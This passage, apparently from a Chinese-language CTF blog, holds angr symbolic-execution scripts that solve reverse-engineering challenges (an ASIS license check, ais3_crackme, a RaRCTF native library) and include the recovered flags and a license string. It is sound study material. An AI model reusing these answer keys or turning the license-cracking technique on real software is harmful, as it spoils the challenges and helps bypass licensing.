    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="0ctf-quals-2016-trace-——"><a href="#0ctf-quals-2016-trace-——" class="headerlink" title="0ctf quals 2016 - trace | ——-"></a>0ctf quals 2016 - trace | ——-</h3><blockquote>
<p>Script author: WGH (<a href="mailto:wgh@bushwhackers.ru">wgh@bushwhackers.ru</a>)<br>Script runtime: 1 min 50 secs (CPython 2.7.10), 1 min 12 secs (PyPy 4.0.1)<br>Concepts presented: guided symbolic tracing</p>
</blockquote>
<p>MIPS 汇编不习惯，下次一定</p>
<h3 id="ASIS-CTF-Finals-2015-license"><a href="#ASIS-CTF-Finals-2015-license" class="headerlink" title="ASIS CTF Finals 2015 - license | ??????"></a>ASIS CTF Finals 2015 - license | ??????</h3><blockquote>
<p>Script author: Fish Wang (github: @ltfish)<br>Script runtime: 3.6 sec<br>Concepts presented: using the filesystem, manual symbolic summary execution</p>
</blockquote>
<p>我写的脚本执行不下去，内存占满了都，暂时不清楚原因。</p>
<p>还得用它提供的符号文件欸，不然自动生成一个，多少有点问题。这道题很有收获，但是有点疑问，就是为什么不适用文件系统符号执行的情况下，程序进行不下去（内存占满。。）被 KILL 了。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr
<span class="token keyword">import</span> claripy

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"license"</span><span class="token punctuation">,</span> load_options<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'auto_load_libs'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

    <span class="token comment"># Create a blank state</span>
    state <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># Build the file whose name is weird</span>
    license_name <span class="token operator">=</span> <span class="token string">"_a\nb\tc_"</span>

    <span class="token comment"># This is the license file</span>
    <span class="token comment"># From analyzing the binary, we know that the license file should have five </span>
    <span class="token comment"># lines in total, and each line has 6 characters. Not setting file content </span>
    <span class="token comment"># may also work, but in that case, angr will produce many more paths, and we </span>
    <span class="token comment"># will spent much more time in path trimming.</span>

    bytestring <span class="token operator">=</span> <span class="token boolean">None</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        line <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token punctuation">]</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            line<span class="token punctuation">.</span>append<span class="token punctuation">(</span>state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'license_file_byte_%d_%d'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            state<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> bytestring <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            bytestring <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>line<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            bytestring <span class="token operator">=</span> bytestring<span class="token punctuation">.</span>concat<span class="token punctuation">(</span>state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span>line<span class="token punctuation">)</span>

    license_file <span class="token operator">=</span> angr<span class="token punctuation">.</span>storage<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">.</span>SimFile<span class="token punctuation">(</span>license_name<span class="token punctuation">,</span> bytestring<span class="token punctuation">)</span>
    state<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>license_name<span class="token punctuation">,</span> license_file<span class="token punctuation">)</span>

    simgr <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>state<span class="token punctuation">)</span>

    simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>
                find<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0x400e93</span><span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>
                avoid<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0x400bb1</span><span class="token punctuation">,</span> <span class="token number">0x400b8f</span><span class="token punctuation">,</span> <span class="token number">0x400b6d</span><span class="token punctuation">,</span> <span class="token number">0x400a85</span><span class="token punctuation">,</span>
                       <span class="token number">0x400ebf</span><span class="token punctuation">,</span> <span class="token number">0x400a59</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span>

    <span class="token comment"># One path will be found</span>
    found <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    rsp <span class="token operator">=</span> found<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rsp
    flag_addr <span class="token operator">=</span> rsp <span class="token operator">+</span> <span class="token number">0x278</span> <span class="token operator">-</span> <span class="token number">0xd8</span> <span class="token comment"># Ripped from IDA</span>
    <span class="token comment"># Perform an inline call to strlen() in order to determine the length of the </span>
    <span class="token comment"># flag</span>
    FAKE_ADDR <span class="token operator">=</span> <span class="token number">0x100000</span>
    strlen <span class="token operator">=</span> <span class="token keyword">lambda</span> state<span class="token punctuation">,</span> arguments<span class="token punctuation">:</span> \
        angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'libc'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'strlen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> FAKE_ADDR<span class="token punctuation">,</span> p<span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">.</span>execute<span class="token punctuation">(</span>
            state<span class="token punctuation">,</span> arguments<span class="token operator">=</span>arguments
        <span class="token punctuation">)</span>
    flag_length <span class="token operator">=</span> strlen<span class="token punctuation">(</span>found<span class="token punctuation">,</span> arguments<span class="token operator">=</span><span class="token punctuation">[</span>flag_addr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ret_expr
    <span class="token comment"># In case it's not null-terminated, we get the least number as the length</span>
    flag_length_int <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>found<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>eval_upto<span class="token punctuation">(</span>flag_length<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># Read out the flag!</span>
    flag_int <span class="token operator">=</span> found<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>found<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>flag_addr<span class="token punctuation">,</span> flag_length_int<span class="token punctuation">)</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>flag_int<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> flag

<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> main<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b'ASIS&#123;8d2cc30143831881f94cb05dcf0b83e0&#125;'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr
<span class="token keyword">import</span> claripy
<span class="token keyword">import</span> IPython

LEN  <span class="token operator">=</span> <span class="token number">0</span>
addr <span class="token operator">=</span> <span class="token number">0x100000</span>
license_name <span class="token operator">=</span> <span class="token string">"_a\nb\tc_"</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> LEN

    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./license"</span><span class="token punctuation">)</span>
    length <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"length"</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span>
    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>full_init_state<span class="token punctuation">(</span><span class="token punctuation">)</span>
    st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45235</span> <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">*</span> length
                <span class="token operator">-</span> <span class="token number">1256</span> <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">*</span> length
                <span class="token operator">+</span> <span class="token number">14392</span> <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">-</span> <span class="token number">59762</span>
                <span class="token operator">*</span> length <span class="token operator">-</span> <span class="token number">0x1C5F164EF8C</span> <span class="token operator">+</span> <span class="token number">44242</span>
                <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    LEN <span class="token operator">=</span> st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">hook_str_addr</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>
        state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rax <span class="token operator">=</span> addr
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ADDR = "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>

    bytestring <span class="token operator">=</span> <span class="token boolean">None</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        line <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token punctuation">]</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            line<span class="token punctuation">.</span>append<span class="token punctuation">(</span>st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'license_file_byte_%d_%d'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            st<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> bytestring <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            bytestring <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>line<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            bytestring <span class="token operator">=</span> bytestring<span class="token punctuation">.</span>concat<span class="token punctuation">(</span>st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span>line<span class="token punctuation">)</span>

    <span class="token comment"># license_chars = [claripy.BVS("license_%d" % i,8) for i in range(LEN)]</span>
    <span class="token comment"># license_stream = claripy.Concat(*license_chars)</span>
    <span class="token comment"># license_file = angr.storage.file.SimFile(license_name, license_stream)</span>
    <span class="token comment"># st.fs.insert(license_name, license_file)</span>

    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x400A30</span><span class="token punctuation">,</span>hook_str_addr<span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>

    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>
    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x400BD0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>avoid<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x400BB1</span><span class="token punctuation">,</span><span class="token number">0x400B9F</span><span class="token punctuation">,</span><span class="token number">0x400EBF</span><span class="token punctuation">,</span><span class="token number">0x400B77</span><span class="token punctuation">,</span><span class="token number">0x400A85</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x400E9D</span><span class="token punctuation">]</span><span class="token punctuation">,</span>avoid<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x400BB1</span><span class="token punctuation">,</span><span class="token number">0x400B9F</span><span class="token punctuation">,</span><span class="token number">0x400EBF</span><span class="token punctuation">,</span><span class="token number">0x400B77</span><span class="token punctuation">,</span><span class="token number">0x400A85</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    
    found       <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    flag_addr   <span class="token operator">=</span> found<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rsp <span class="token operator">+</span> <span class="token number">0x1A0</span>

    flag_int    <span class="token operator">=</span> found<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>found<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>flag_addr<span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    flag        <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>flag_int<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    license_int <span class="token operator">=</span> found<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>eval_upto<span class="token punctuation">(</span>found<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>addr<span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    license     <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>license_int<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"flag"</span><span class="token punctuation">:</span>flag<span class="token punctuation">,</span><span class="token string">"license"</span><span class="token punctuation">:</span>license<span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> main<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">&#123;</span><span class="token string">"flag"</span><span class="token punctuation">:</span><span class="token string">b"ASIS&#123;8d2cc30143831881f94cb05dcf0b83e0&#125;"</span><span class="token punctuation">,</span>
                    <span class="token string">"license"</span><span class="token punctuation">:</span><span class="token string">b"tl9GUA\n\x1d'n(\x0f\r\n/\x15:\x15\x1d3\nhgyGxW\n49\x064(."</span><span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="ais3-crackme-DONE"><a href="#ais3-crackme-DONE" class="headerlink" title="ais3_crackme |DONE"></a>ais3_crackme |DONE</h3><p>从命令行中输入 flag ，求解 。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr
<span class="token keyword">import</span> claripy
<span class="token keyword">import</span> IPython

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./ais3_crackme"</span><span class="token punctuation">)</span>

    <span class="token comment"># p.hook(0x40060E,print("failed"),length=0)</span>

    flag_chars <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"flag_%d"</span> <span class="token operator">%</span>i<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_chars<span class="token operator">+</span><span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"flag_tail"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>full_init_state<span class="token punctuation">(</span>
        args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"./ais3_crackme"</span><span class="token punctuation">,</span>flag<span class="token punctuation">]</span>
    <span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_chars<span class="token punctuation">:</span>
        st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0x20</span><span class="token punctuation">)</span>

    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>
    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x400607</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    found <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

    <span class="token comment"># print(sm.stashes)</span>
    <span class="token comment"># IPython.embed()</span>

    <span class="token keyword">return</span> found<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="RaRCTF2021-Jammy’s-Old-Infra-DONE"><a href="#RaRCTF2021-Jammy’s-Old-Infra-DONE" class="headerlink" title="RaRCTF2021 Jammy’s Old Infra |DONE"></a>RaRCTF2021 Jammy’s Old Infra |DONE</h3><p>不会调试，等一个有缘人教我怎么动调 so，我看题目架构都给齐全了呀，为什么 ida 会找不到这个 so 呢。一开始有一个 Decrypt_Key 函数，试着用 angr 执行了一下，还行，一开始用的时候经常给 angr 的大端序小端序坑，X86 都识别出来了，居然还默认用大端序，默认把程序里面的东西都当字符串了呗。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># ~/.virtualenvs/angr/bin/python</span>
<span class="token keyword">import</span> IPython
<span class="token keyword">import</span> angr

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    base <span class="token operator">=</span> <span class="token number">0x0</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./libnative-lib.so"</span><span class="token punctuation">,</span>load_options<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token string">'main_opts'</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>
            <span class="token string">'base_addr'</span> <span class="token punctuation">:</span> base
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

    aes_cbc_decrypt_off <span class="token operator">=</span> <span class="token number">0x85D0</span>
    aes_cbc_decrypt_end <span class="token operator">=</span> <span class="token number">0x8C10</span>
    decryptKey_off      <span class="token operator">=</span> <span class="token number">0x8500</span>
    decryptKey_end      <span class="token operator">=</span> <span class="token number">0x85B4</span>
    error_off           <span class="token operator">=</span> <span class="token number">0x9C99</span>
    a1_pt             <span class="token operator">=</span> <span class="token number">0x3000000</span>
    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr <span class="token operator">=</span> decryptKey_off<span class="token punctuation">)</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebp <span class="token operator">=</span> <span class="token number">0x8000000</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">=</span> <span class="token number">0x9000000</span>  <span class="token comment"># 可能防止内存不对其导致 报错</span>

    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>edi <span class="token operator">=</span> <span class="token number">0x4000000</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> <span class="token number">0x5000000</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ecx <span class="token operator">=</span> <span class="token number">0x0</span>
    st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span><span class="token number">0x9000004</span><span class="token punctuation">,</span><span class="token number">0x3</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>
    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>

    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token punctuation">[</span>decryptKey_end<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x3000000</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token comment"># BE</span>
    <span class="token comment"># 0x800000c0c00000c0c00000c0</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>然后就一发不可收拾了</p>
<p>有两个 chek 函数，一个 check name，一个 check password。</p>
<p>用的 angr 黑盒出来的,直接执行，感觉 angr 的 call 不好用，自己写了一套模板，下次再改进</p>
<p>1、一些简单的函数 hook 可以使用 lambda 表达式<br>2、整体的模板还差一些参数的调整<br>3、有关效率的优化，引擎的优化<br>4、inline_call() emm，我目前还没遇到一个函数太大解决不了需要调用别的内敛的 SimProcedure 的情况，因为目前，就是给每一个调用有点问题的函数来点修饰。</p>
<h4 id="solve-password-py"><a href="#solve-password-py" class="headerlink" title="solve_password.py"></a>solve_password.py</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> angr <span class="token keyword">import</span> Project<span class="token punctuation">,</span>SimProcedure<span class="token punctuation">,</span>SIM_PROCEDURES
<span class="token keyword">import</span> archinfo
<span class="token keyword">import</span> monkeyhex
<span class="token keyword">import</span> claripy
<span class="token keyword">import</span> IPython
<span class="token keyword">import</span> logging

base <span class="token operator">=</span> <span class="token number">0x0</span>

<span class="token keyword">def</span> <span class="token function">call</span><span class="token punctuation">(</span>it<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>function_name<span class="token punctuation">,</span><span class="token operator">*</span>args<span class="token punctuation">,</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    st <span class="token operator">=</span> it<span class="token punctuation">.</span>state
    <span class="token keyword">if</span><span class="token punctuation">(</span>args <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
